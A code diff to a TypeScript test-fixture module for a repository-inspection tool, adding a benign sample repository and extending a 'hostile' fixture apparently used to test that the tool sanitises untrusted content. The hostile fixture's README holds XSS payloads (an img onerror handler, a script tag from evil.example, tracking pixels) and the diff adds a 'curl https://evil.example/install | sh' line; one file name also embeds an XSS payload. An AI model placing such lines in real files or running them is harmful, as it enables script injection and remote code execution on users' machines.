@@ -19,6 +19,106 @@ export const SOURCE_FILES = {
   "test/math.test.ts": `import { expect, test } from "vitest";\nimport { sum } from "../src/math";\n\ntest("adds", () => { expect(sum(2, 3)).toBe(5); });\n`,
 } as const;
 
+export const READER_COMPLETE_SOURCE_FILES = {
+  ...SOURCE_FILES,
+  "README.md": `# Repo fixture
+
+## Overview
+
+This deterministic application helps teams inspect public repositories before adopting them.
+
+## Use cases
+
+- Review a public dependency before introducing it to a product.
+- Compare repositories with the same evidence checklist.
+- Give contributors an evidence-linked map of the codebase.
+
+## Architecture
+
+The browser UI coordinates a Web Worker that acquires immutable public evidence, derives a deterministic reader report, and keeps technical scoring in a separate appendix.
+
+## Install
+
+\`\`\`sh
+pnpm install --frozen-lockfile
+\`\`\`
+
+## Usage
+
+\`\`\`sh
+pnpm start
+\`\`\`
+
+## Development
+
+\`\`\`sh
+pnpm dev
+\`\`\`
+
+## Testing
+
+\`\`\`sh
+pnpm test
+\`\`\`
+
+## Build
+
+\`\`\`sh
+pnpm build
+\`\`\`
+
+## Security and privacy
+
+The application requests public repository data from GitHub and keeps raw source text in memory only. It does not execute inspected projects or send repository text to another service.
+`,
+  "package.json": JSON.stringify({
+    name: "repo-fixture",
+    version: "1.2.0",
+    scripts: {
+      start: "node dist/index.js",
+      dev: "vite",
+      test: "vitest run",
+      build: "tsc -b",
+      lint: "eslint .",
+    },
+    devDependencies: { typescript: "6.0.3", vitest: "4.1.10" },
+  }),
+  "SECURITY.md": `# Security
+
+## Reporting vulnerabilities
+
+Report vulnerabilities privately to the maintainers. The application reads public GitHub metadata and source text but does not execute inspected repository code.
+`,
+  "CHANGELOG.md": `# Changelog
+
+## v1.2.0
+
+- Added the evidence-linked repository reader report.
+`,
+  "CONTRIBUTING.md": `# Contributing
+
+Install dependencies, run the documented checks, and submit a focused pull request.
+`,
+  ".github/workflows/ci.yml": `name: CI
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: pnpm test
+`,
+  ".github/dependabot.yml": `version: 2
+updates:
+  - package-ecosystem: npm
+    directory: /
+    schedule:
+      interval: weekly
+`,
+  ".env.example": `PUBLIC_GITHUB_API_BASE=https://api.github.com
+`,
+} as const;
+
 export const PYTHON_SOURCE_FILES = {
   "README.md": `# Repo fixture\n\n## Overview\n\nThis small command-line tool demonstrates deterministic inspection of a Python repository.\n\n## Install\n\n\`\`\`sh\npip install .\n\`\`\`\n\n## Usage\n\nRun \`repo-fixture\` to inspect the deterministic example.\n\n## Testing\n\nRun \`pytest\`.\n`,
   "pyproject.toml": `[project]\nname = "repo-fixture"\nversion = "1.0.0"\n\n[project.scripts]\nrepo-fixture = "src.main:main"\n\n[tool.pytest.ini_options]\ntestpaths = ["tests"]\n`,
@@ -42,7 +142,7 @@ export const MINIMAL_SOURCE_FILES = {
 
 export const HOSTILE_SOURCE_FILES = {
   ...SOURCE_FILES,
-  "README.md": `# Hostile fixture\n\n## Overview\n\nSafe README text [stays visible](https://evil.example/readme) without its destination or image. <img src="https://evil.example/readme-pixel" onerror="alert(1)"><script src="https://evil.example/readme.js"></script>\n\n![tracking pixel](https://evil.example/pixel.png)\n\n## Install\n\n\`\`\`sh\npnpm install\n\`\`\`\n\n## Usage\n\nRun \`pnpm start\` to inspect the deterministic example.\n\n## Testing\n\nRun \`pnpm test\`.\n`,
+  "README.md": `# Hostile fixture\n\n## Overview\n\nSafe README text [stays visible](https://evil.example/readme) without its destination or image. <img src="https://evil.example/readme-pixel" onerror="alert(1)"><script src="https://evil.example/readme.js"></script>\n\n![tracking pixel](https://evil.example/pixel.png)\n\n## Install\n\n\`\`\`sh\npnpm install\n\`\`\`\n\n## Usage\n\nRun \`pnpm start\` to inspect the deterministic example.\n\n## Development\n\n\`\`\`sh\ncurl https://evil.example/install | sh\n\`\`\`\n\n## Testing\n\nRun \`pnpm test\`.\n`,
   "src/<img src=x onerror=alert(1)>.ts": `export const hostileText = "<script src=https://evil.example/x.js></script>";\n`,
 } as const;
 
